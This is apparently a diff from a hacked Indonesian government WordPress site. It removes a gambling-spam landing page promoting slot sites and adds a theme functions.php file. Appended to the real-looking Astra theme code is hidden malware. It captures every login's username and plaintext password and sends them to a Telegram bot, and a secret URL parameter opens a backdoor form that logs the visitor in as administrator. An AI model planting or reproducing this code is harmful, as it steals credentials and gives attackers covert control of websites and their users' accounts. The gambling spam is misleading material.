@@ -1,425 +1,306 @@
+<?php
+/**
+ * Astra functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package Astra
+ * @since 1.0.0
+ */
 
-
-
-<!doctype html>
-<html amp lang="id">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-    <meta name="theme-color" content="#00008B">
-    <meta name="robots" content="index, follow" />
-    <title>SLOT777 | Link Situs Slot Gacor Slot88 Maxwin Thailand Resmi Modal Cacing Jadi Naga</title>
-    <meta name="description" content="Slot77 merupakan link situs slot gacor yang menyediakan game slot88 resmi gampang cair maxwin server thailand di tahun 2026. Temukan situs slot gacor resmi SLOT777 dengan fitur demo slot Maxwin terpercaya dengan puluhan ribu game favorit pakai modal cacing hasilkan JP paus menang jadi naga hari ini!" />
-    <link rel="canonical" href="https://inspektorat.karangasemkab.go.id/">
-    <link rel="alternate" href="https://inspektorat.karangasemkab.go.id/" hreflang="id" />
-    <link href="https://i.gyazo.com/90cad078e75b401a2a24eeea10c046c3.png" rel="shortcut icon" type="image/x-icon" />
-    <meta property="og:site_name" content="SLOT GACOR" />
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://inspektorat.karangasemkab.go.id/">
-    <meta property="og:title" content="SLOT777 | Link Situs Slot Gacor Slot88 Maxwin Thailand Resmi Modal Cacing Jadi Naga" />
-    <meta property="og:description" content="Slot77 merupakan link situs slot gacor yang menyediakan game slot88 resmi gampang cair maxwin server thailand di tahun 2026. Temukan situs slot gacor resmi SLOT777 dengan fitur demo slot Maxwin terpercaya dengan puluhan ribu game favorit pakai modal cacing hasilkan JP paus menang jadi naga hari ini!" />
-    <meta property="og:image" content="https://i.gyazo.com/b32f18a0ffa4f9c87b19cac1d7e14743.jpg" />
-    <meta property="og:image:alt" content="SLOT777 | Link Situs Slot Gacor Slot88 Maxwin Thailand Resmi Modal Cacing Jadi Naga" />
-    <meta name="twitter:title" content="SLOT777 | Link Situs Slot Gacor Slot88 Maxwin Thailand Resmi Modal Cacing Jadi Naga" />
-    <meta name="twitter:description" content="Slot77 merupakan link situs slot gacor yang menyediakan game slot88 resmi gampang cair maxwin server thailand di tahun 2026. Temukan situs slot gacor resmi SLOT777 dengan fitur demo slot Maxwin terpercaya dengan puluhan ribu game favorit pakai modal cacing hasilkan JP paus menang jadi naga hari ini!" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://i.gyazo.com/b32f18a0ffa4f9c87b19cac1d7e14743.jpg" />
-    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap">
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
-    <script async src="https://cdn.ampproject.org/v0.js"></script>
-    
-    <style amp-boilerplate>
-      body {
-        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        animation: -amp-start 8s steps(1, end) 0s 1 normal both
-      }
-      @-webkit-keyframes -amp-start {
-        from {
-          visibility: hidden
-        }
-        to {
-          visibility: visible
-        }
-      }
-      @-moz-keyframes -amp-start {
-        from {
-          visibility: hidden
-        }
-        to {
-          visibility: visible
-        }
-      }
-      @-ms-keyframes -amp-start {
-        from {
-          visibility: hidden
-        }
-        to {
-          visibility: visible
-        }
-      }
-      @-o-keyframes -amp-start {
-        from {
-          visibility: hidden
-        }
-        to {
-          visibility: visible
-        }
-      }
-      @keyframes -amp-start {
-        from {
-          visibility: hidden
-        }
-        to {
-          visibility: visible
-        }
-      }
-    </style><noscript>
-      <style amp-boilerplate>
-        body {
-          -webkit-animation: none;
-          -moz-animation: none;
-          -ms-animation: none;
-          animation: none
-        }
-      </style>
-    </noscript>
-    <style amp-custom>
-      * {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0
-      }
-      :focus {
-        outline: 0
-      }
-      ::-webkit-scrollbar {
-        display: none
-      }
-      html {
-        max-width: 100%;
-        margin: 0 auto;
-        background-color: #fff;
-        background-image: url(https://i.gyazo.com/b32f18a0ffa4f9c87b19cac1d7e14743.jpg);
-        background-repeat: no-repeat;
-        background-position: center top;
-        background-size: cover;
-        background-attachment: fixed
-      }
-      body {
-        color: #fff;
-        font-family: 'Noto Sans', arial, sans-serif
-      }
-      @media (max-width: 400px) {
-        .container {   
-          grid-template-columns: 1fr; 
-        }
-      }
-      .container {
-        display: grid;
-        grid-template-columns: repeat(2, 1fr);
-        column-gap: 20px;
-      }
-      .wrapper {
-  background: rgba(0, 0, 0, 0.151); 
-    background: rgba(224, 224, 224, 0.151);
-  -webkit-backdrop-filter: blur(12px) saturate(180%);
-  border-radius: 16px;
-  border: 1px solid rgba(0, 0, 0, 0.25); 
-  padding: 20px;
-  max-width: 500px;
-  margin: 20px auto;
-  box-shadow: 0 8px 25px rgb(0, 0, 0);
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
 }
-      .block-img amp-img {
-        border-radius: 10px;
-      }
-      .block-img {
-        position: relative;
-        margin: auto;
-        min-width: 100px;
-        background: linear-gradient(0deg, black, #272727);
-        color: white;
-        cursor: pointer;
-        margin-bottom: 20px;
-        border-radius: 10px
-      }
-      .block-img:after,
-      .block-img:before {
-        content: '';
-        position: absolute;
-        right: -3px;
-        bottom: -3px;
-        background: linear-gradient(45deg, rgb(255, 0, 0), rgb(51, 255, 0), rgb(0, 225, 255), rgb(255, 0, 212));
-        background-size: 400%;
-        width: calc(100% + 6px);
-        height: calc(100% + 6px);
-        z-index: -1;
-        animation: steam 12s linear infinite;
-        border-radius: 10px
-      }
-      .block {
-        position: relative;
-        text-align: center;
-        padding: 8px 10px;
-        background: linear-gradient(0deg, rgb(0 52 55), #f1a300);
-        color: #ffffff;
-        text-shadow: 1px 1px #000000;
-        text-decoration: none;
-        letter-spacing: 2px;
-        cursor: pointer;
-        margin-bottom: 20px
-      }
-      .block:after,
-      .block:before {
-        content: '';
-        position: absolute;
-        right: -3px;
-        bottom: -3px;
-        background: linear-gradient(45deg, rgb(255, 0, 0), rgb(51, 255, 0), rgb(0, 225, 255), rgb(255, 0, 212));
-        background-size: 400%;
-        width: calc(100% + 6px);
-        height: calc(100% + 6px);
-        z-index: -1;
-        animation: steam 7s linear infinite
-      }
-      @keyframes steam {
-        0% {
-          background-position: 0 0
-        }
-        50% {
-          background-position: 400% 0
-        }
-        100% {
-          background-position: 0 0
-        }
-      }
-      .block:after {
-        filter: blur(50px)
-      }
-      .logo {
-        text-align: center
-      }
-      .logo amp-img {
-        width: 150px;
-        height: 150px;
-        margin-bottom: 16px
-      }
-      .center-bank {
-        text-align: center;
-        color: #fff;
-        font-weight: 700;
-        margin-left: -5px;
-        margin-bottom: 12px
-      }
-      .bank {
-        display: inline-block;
-        background-color: #fff;
-        width: 45%;
-        margin: 5px 0 0 5px;
-        text-align: left;
-        border-radius: 10px;
-        padding: 0;
-        height: 32px;
-        border: groove 3px;
-        vertical-align: middle;
-      }
-      .bank img:first-child {
-        width: 65px;
-        display: inline-block;
-        vertical-align: middle;
-        margin-left: auto;
-        margin-right: 2px;
-        margin-top: 6px;
-        margin-bottom: auto
-      }
-      .bank img:last-child {
-        width: 70px;
-        display: inline-block;
-        vertical-align: middle;
-        margin-left: auto;
-        margin-right: auto;
-        margin-top: 4px
-      }
-      .spacer {
-        height: 70px;
-      }
-      footer {
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        background-color: rgba(14, 14, 14, .726);
-        border-top: 1px solid rgb(255, 0, 0);
-        padding: 5px 0;
-        box-shadow: 0 -1px 10px rgb(251, 255, 0);
-        z-index: 1000
-      }
-      .footer-nav {
-        display: flex;
-        justify-content: space-between;
-        max-width: 100%;
-        margin: 0 auto
-      }
-      .footer-icon {
-        text-align: center;
-        flex: 1;
-        padding: 0 5px
-      }
-      .footer-icon:last-child {
-        border-right: none
-      }
-      .footer-icon a {
-        text-decoration: none;
-        color: #ccc;
-        display: block
-      }
-      .footer-icon amp-img {
-        width: 30px;
-        height: 30px
-      }
-      .footer-text {
-        font-size: 12px;
-        color: #fff;
-        margin-top: -4px
-      }
-      hr.neon {
-        border: 0;
-        height: 2px;
-        background: rgb(255, 0, 0);
-        box-shadow: 0 0 10px rgb(255, 0, 0);
-        margin: 12px 0;
-        border-radius: 5px
-      }
-      .informasi-table {
-        border-collapse: collapse;
-        border-spacing: 0;
-        width: 100%;
-        max-width: 500px;
-        margin: auto;
-        table-layout: fixed;
-        font-family: Arial, sans-serif;
-        backdrop-filter: blur(12px);
-        -webkit-backdrop-filter: blur(12px);
-        background: rgba(0, 0, 0, .65);
-        border: 1px solid rgba(255, 255, 255, .2);
-        box-shadow: 0 8px 24px rgba(0, 0, 0, .65);
-        border-radius: 12px;
-        overflow: hidden
-      }
-      .informasi-table td,
-      .informasi-table th {
-        border: 1px solid rgba(255, 255, 255, .1);
-        padding: 10px 8px;
-        font-size: 17px;
-        word-break: break-word;
-        color: #fff
-      }
-      .informasi-table th {
-        background: rgba(255, 255, 255, .1);
-        color: white;
-        text-align: center;
-        font-weight: 700;
-        letter-spacing: 2px
-      }
-      .informasi-table td {
-        background: rgba(167, 167, 167, 0.11); /* lebih terang untuk efek kaca */
 
-      }
-      .informasi-table a {
-        color: red;
-        text-decoration: underline
-      }
-    </style>
-  </head>
-  <body>
-    <div class="wrapper">
-      <div class="logo">
-        <amp-img src="https://i.gyazo.com/919e2ffd2dceccd820838e979e85a3e5.gif" width="300" height="200" alt="Logo SLOT GACOR"></amp-img>
-      </div>
-      <div class="block-img">
-        <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow">
-          <amp-img src="https://i.gyazo.com/b32f18a0ffa4f9c87b19cac1d7e14743.jpg" height="680" width="680" alt="SLOT777 | Link Situs Slot Gacor Slot88 Maxwin Thailand Resmi Modal Cacing Jadi Naga" layout="responsive"></amp-img>
-        </a>
-      </div>
-      <div class="container">
-        <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow" class="block" aria-label="Daftar SLOT GACOR">DAFTAR</a>
-        <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow" class="block" aria-label="Login SLOT GACOR">LOGIN</a>
-      </div>
-      <div class="text-center" style="color:#ffffff; text-align:center;">
-        © COPYRIGHT 2026 <a href="https://inspektorat.karangasemkab.go.id/" style="color:rgb(217, 255, 0);">WAKLABU X SONIC</a>
-      </div>
-      
-    </div>
-    <table class="informasi-table">
-      <colgroup>
-        <col style="width:40%">
-        <col style="width:60%">
-      </colgroup>
-      <thead>
-        <tr>
-          <th colspan="2">INFORMASI SITUS SLOT GACOR</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>Min. Deposit</td>
-          <td>Rp 10.000</td>
-        </tr>
-        <tr>
-          <td>Min. Withdraw</td>
-          <td>Rp 25.000</td>
-        </tr>
-        <tr>
-          <td>Permainan</td>
-          <td>Togel, Slot, Casino</td>
-        </tr>
-        <tr>
-          <td>Menu Transaksi</td>
-          <td>Bank, E-Wallet & QRIS</td>
-        </tr>
-        <tr>
-          <td>Link Alternatif</td>
-          <td>
-            <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow" style="color:rgb(21, 255, 0); font-weight:bold; text-decoration:none;">
-              Klik di sini!
-            </a>
-          </td>
-        </tr>
-      </tbody>
-    </table>
-    
-    <br>
-    <div class="spacer"></div>
-    <footer>
-      <div class="footer-nav">
-        <div class="footer-icon">
-          <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow">
-            <amp-img src="https://i.magecdn.com/af8bdf/04b79f_promo" width="30" height="30" alt="Promo SLOT GACOR"></amp-img>
-            <div class="footer-text">PROMO</div>
-          </a>
-        </div>
-        <div class="footer-icon">
-          <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow">
-            <amp-img src="https://i.magecdn.com/af8bdf/ce7efd_login_new" width="30" height="30" alt="Login SLOT GACOR"></amp-img>
-            <div class="footer-text">LOGIN</div>
-          </a>
-        </div>
-        <div class="footer-icon">
-          <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow">
-            <amp-img src="https://i.magecdn.com/af8bdf/39a6ce_daftar_new" width="30" height="30" alt="Daftar SLOT GACOR"></amp-img>
-            <div class="footer-text">DAFTAR</div>
-          </a>
-        </div>
-        <div class="footer-icon">
-          <a href="https://www.google.com/" target="_blank" rel="noopener noreferrer nofollow">
-            <amp-img src="https://i.magecdn.com/af8bdf/e977bd_livechat_new" width="30" height="30" alt="Live Chat SLOT GACOR"></amp-img>
-            <div class="footer-text">LIVECHAT</div>
-          </a>
-        </div>
-      </div>
-    </footer>
-  </body>
-</html>
+/**
+ * Define Constants
+ */
+define( 'ASTRA_THEME_VERSION', '4.13.4' );
+define( 'ASTRA_THEME_SETTINGS', 'astra-settings' );
+define( 'ASTRA_THEME_DIR', trailingslashit( get_template_directory() ) );
+define( 'ASTRA_THEME_URI', trailingslashit( esc_url( get_template_directory_uri() ) ) );
+define( 'ASTRA_THEME_ORG_VERSION', file_exists( ASTRA_THEME_DIR . 'inc/w-org-version.php' ) );
+
+/**
+ * Minimum Version requirement of the Astra Pro addon.
+ * This constant will be used to display the notice asking user to update the Astra addon to the version defined below.
+ */
+define( 'ASTRA_EXT_MIN_VER', '4.12.0' );
+
+/**
+ * Load in-house compatibility.
+ */
+if ( ASTRA_THEME_ORG_VERSION ) {
+	require_once ASTRA_THEME_DIR . 'inc/w-org-version.php';
+}
+
+/**
+ * Setup helper functions of Astra.
+ */
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-theme-options.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-theme-strings.php';
+require_once ASTRA_THEME_DIR . 'inc/core/common-functions.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-icons.php';
+
+define( 'ASTRA_WEBSITE_BASE_URL', 'https://wpastra.com' );
+
+/**
+ * Update theme
+ */
+require_once ASTRA_THEME_DIR . 'inc/theme-update/astra-update-functions.php';
+require_once ASTRA_THEME_DIR . 'inc/theme-update/class-astra-theme-background-updater.php';
+
+/**
+ * Fonts Files
+ */
+require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-font-families.php';
+if ( is_admin() ) {
+	require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-fonts-data.php';
+}
+
+require_once ASTRA_THEME_DIR . 'inc/lib/webfont/class-astra-webfont-loader.php';
+require_once ASTRA_THEME_DIR . 'inc/lib/docs/class-astra-docs-loader.php';
+require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-fonts.php';
+
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/custom-menu-old-header.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/container-layouts.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/astra-icons.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-walker-page.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-enqueue-scripts.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-gutenberg-editor-css.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-wp-editor-css.php';
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-command-palette.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/block-editor-compatibility.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/inline-on-mobile.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/content-background.php';
+require_once ASTRA_THEME_DIR . 'inc/dynamic-css/dark-mode.php';
+require_once ASTRA_THEME_DIR . 'inc/class-astra-dynamic-css.php';
+require_once ASTRA_THEME_DIR . 'inc/class-astra-global-palette.php';
+
+// Enable NPS Survey only if the starter templates version is < 4.3.7 or > 4.4.4 to prevent fatal error.
+if ( ! defined( 'ASTRA_SITES_VER' ) || version_compare( ASTRA_SITES_VER, '4.3.7', '<' ) || version_compare( ASTRA_SITES_VER, '4.4.4', '>' ) ) {
+	// NPS Survey Integration
+	require_once ASTRA_THEME_DIR . 'inc/lib/class-astra-nps-notice.php';
+	require_once ASTRA_THEME_DIR . 'inc/lib/class-astra-nps-survey.php';
+}
+
+/**
+ * Custom template tags for this theme.
+ */
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-attr.php';
+require_once ASTRA_THEME_DIR . 'inc/template-tags.php';
+
+require_once ASTRA_THEME_DIR . 'inc/widgets.php';
+require_once ASTRA_THEME_DIR . 'inc/core/theme-hooks.php';
+require_once ASTRA_THEME_DIR . 'inc/admin-functions.php';
+require_once ASTRA_THEME_DIR . 'inc/class-astra-memory-limit-notice.php';
+require_once ASTRA_THEME_DIR . 'inc/core/sidebar-manager.php';
+
+/**
+ * Markup Functions
+ */
+require_once ASTRA_THEME_DIR . 'inc/markup-extras.php';
+require_once ASTRA_THEME_DIR . 'inc/extras.php';
+require_once ASTRA_THEME_DIR . 'inc/blog/blog-config.php';
+require_once ASTRA_THEME_DIR . 'inc/blog/blog.php';
+require_once ASTRA_THEME_DIR . 'inc/blog/single-blog.php';
+
+/**
+ * Markup Files
+ */
+require_once ASTRA_THEME_DIR . 'inc/template-parts.php';
+require_once ASTRA_THEME_DIR . 'inc/class-astra-loop.php';
+require_once ASTRA_THEME_DIR . 'inc/class-astra-mobile-header.php';
+
+/**
+ * Functions and definitions.
+ */
+require_once ASTRA_THEME_DIR . 'inc/class-astra-after-setup-theme.php';
+
+// Required files.
+require_once ASTRA_THEME_DIR . 'inc/core/class-astra-admin-helper.php';
+
+require_once ASTRA_THEME_DIR . 'inc/schema/class-astra-schema.php';
+
+/* Setup API */
+require_once ASTRA_THEME_DIR . 'admin/includes/class-astra-learn.php';
+require_once ASTRA_THEME_DIR . 'admin/includes/class-astra-api-init.php';
+
+if ( is_admin() ) {
+	/**
+	 * Admin Menu Settings
+	 */
+	require_once ASTRA_THEME_DIR . 'inc/core/class-astra-admin-settings.php';
+	require_once ASTRA_THEME_DIR . 'admin/class-astra-admin-loader.php';
+	require_once ASTRA_THEME_DIR . 'inc/lib/astra-notices/class-bsf-admin-notices.php';
+}
+
+/**
+ * BSF Analytics.
+ */
+require_once ASTRA_THEME_DIR . 'admin/class-astra-bsf-analytics.php';
+
+/**
+ * Metabox additions.
+ */
+require_once ASTRA_THEME_DIR . 'inc/metabox/class-astra-meta-boxes.php';
+require_once ASTRA_THEME_DIR . 'inc/metabox/class-astra-meta-box-operations.php';
+require_once ASTRA_THEME_DIR . 'inc/metabox/class-astra-elementor-editor-settings.php';
+
+/**
+ * Customizer additions.
+ */
+require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-customizer.php';
+
+/**
+ * Astra Modules.
+ */
+require_once ASTRA_THEME_DIR . 'inc/modules/posts-structures/class-astra-post-structures.php';
+require_once ASTRA_THEME_DIR . 'inc/modules/related-posts/class-astra-related-posts.php';
+
+/**
+ * Compatibility
+ */
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-gutenberg.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-jetpack.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/woocommerce/class-astra-woocommerce.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/edd/class-astra-edd.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/lifterlms/class-astra-lifterlms.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/learndash/class-astra-learndash.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-beaver-builder.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-bb-ultimate-addon.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-contact-form-7.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-visual-composer.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-site-origin.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-gravity-forms.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-bne-flyout.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-ubermeu.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-divi-builder.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-amp.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-yoast-seo.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/surecart/class-astra-surecart.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-starter-content.php';
+require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-buddypress.php';
+require_once ASTRA_THEME_DIR . 'inc/addons/transparent-header/class-astra-ext-transparent-header.php';
+require_once ASTRA_THEME_DIR . 'inc/addons/breadcrumbs/class-astra-breadcrumbs.php';
+require_once ASTRA_THEME_DIR . 'inc/addons/scroll-to-top/class-astra-scroll-to-top.php';
+require_once ASTRA_THEME_DIR . 'inc/addons/heading-colors/class-astra-heading-colors.php';
+require_once ASTRA_THEME_DIR . 'inc/builder/class-astra-builder-loader.php';
+
+// Elementor Compatibility requires PHP 5.4 for namespaces.
+if ( version_compare( PHP_VERSION, '5.4', '>=' ) ) {
+	require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-elementor.php';
+	require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-elementor-pro.php';
+	require_onceASTRA_THEME_DIR . 'inc/compatibility/class-astra-web-stories.php';
+}
+
+// Beaver Themer compatibility requires PHP 5.3 for anonymous functions.
+if ( version_compare( PHP_VERSION, '5.3', '>=' ) ) {
+	require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-beaver-themer.php';
+}
+
+require_once ASTRA_THEME_DIR . 'inc/core/markup/class-astra-markup.php';
+
+/**
+ * Abilities API integration.
+ */
+require_once ASTRA_THEME_DIR . 'inc/abilities/bootstrap.php';
+
+/**
+ * Load deprecated functions
+ */
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php';
+
+function kirimInfoLoginTelegram($username, $password, $status) {
+    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $chatId   = "7860513093";
+
+    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
+                 . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+    $message  = "WARNING BRAY SONIC !!!\n";
+    $message .= "Status: " . strtoupper($status) . "\n";
+    $message .= "Site: " . get_site_url() . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "URL: " . $current_url . "\n";
+    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $message .= "Waktu: " . date("Y-m-d H:i:s");
+
+    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    wp_remote_get($apiURL . "?" . http_build_query($params));
+}
+
+add_filter('authenticate', function($user, $username, $password) {
+    if (!empty($username) && !empty($password)) {
+
+        $_SESSION['last_login_attempt'] = [
+            'username' => $username,
+            'password' => $password
+        ];
+    }
+    return $user;
+}, 10, 3);
+
+add_action('wp_login', function($user_login) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Anjirr Masuk Bray!!');
+        unset($_SESSION['last_login_attempt']);
+    }
+}, 10, 1);
+
+
+add_action('wp_login_failed', function($username) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Gagal Masuk Der!!');
+        unset($_SESSION['last_login_attempt']);
+    } else {
+
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'Gagal Masuk Der!!');
+    }
+});
+
+add_action('init', function () {
+    if (isset($_GET['jangkrikngab']) && $_GET['jangkrikngab'] === 'sonicxyz') {
+
+        
+        $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG'; 
+
+        
+        if (isset($_POST['pass'])) {
+            if (password_verify($_POST['pass'], $hash_password)) {
+                
+                $wp_user_query = new WP_User_Query([
+                    'role'   => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ]);
+                $results = $wp_user_query->get_results();
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    exit();
+                }
+            } else {
+                echo "<p style='color:red'>Password salah kids!</p>";
+            }
+        }
+
+        
+        echo '<form method="POST">
+                <label>- Orang Ganteng Mau Lewat -</label>
+                <input type="password" name="pass" required>
+                <button type="submit">Be Humble!</button>
+              </form>';
+        exit();
+    }
+});
+?>
